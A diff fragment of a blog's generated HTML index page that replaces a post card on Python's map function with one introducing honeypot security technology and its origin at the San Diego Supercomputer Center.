-map迭代操作,传入函数和迭代序
+                            蜜罐技术以及思想以下仅为本人对于蜜罐的一些认识，其中引用了有用的回答，如有侵权，请发邮件给我，下文如有错误，敬请指出
+来源蜜罐技术最早应用于圣地牙哥超级电脑中心， 由以为安全专家设立”蜜罐”引诱攻击者上钩， 通过朔源技术追踪，最终逮捕入侵者
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-21
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-08
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/python/" class="post-category">
-                                    python
+                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category">
+                                    安全
                                 </a>
                             
                             
@@ -793,8 +817,8 @@ map迭代操作,传入函数和迭代序
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/python/">
-                        <span class="chip bg-color">python</span>
+                    <a href="/tags/%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">安全</span>
                     </a>
                     
                 </div>
